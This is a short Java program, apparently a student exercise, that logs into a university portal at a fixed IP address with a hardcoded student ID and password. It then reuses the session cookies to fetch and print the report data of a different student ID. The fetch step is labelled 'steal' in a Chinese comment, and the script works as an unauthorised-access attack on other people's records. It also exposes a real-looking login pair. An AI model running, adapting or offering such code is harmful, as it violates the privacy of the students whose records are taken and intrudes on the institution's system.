package tw.edu.kuas.mis.s1101137209.d0715;


import com.jerrywu.http.HTTPConnection;
import com.jerrywu.http.HTTPMethod;
import com.jerrywu.http.HTTPRequestTag;
import com.jerrywu.http.HTTPResponseTag;


public class D0717chatim {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
		////  登入
			HTTPConnection con = new HTTPConnection();
			
			HTTPRequestTag request = new HTTPRequestTag("http://140.127.113.231/kuas/perchk.jsp",HTTPMethod.POST); 
			
			request.pushAttributes("uid", "1101137240" );
			request.pushAttributes("pwd", "2843" );
			
			HTTPResponseTag response = con.getResult(request, "utf-8");
			
			
		//// 竊取
			
			HTTPRequestTag requestData = new HTTPRequestTag("http://140.127.113.231/kuas/ag_pro/ag007_rpt.jsp",HTTPMethod.POST); 
			
			requestData.setCookies(response.getCookies());
			
			requestData.pushAttributes("year", "102");
			requestData.pushAttributes("sms", "2");
			requestData.pushAttributes("std_id", "1101137239");
			
			HTTPResponseTag responseStudentData = con.getResult(requestData, "utf-8");
			
			System.out.println(responseStudentData.getResponse());
			
			
			

	}

}
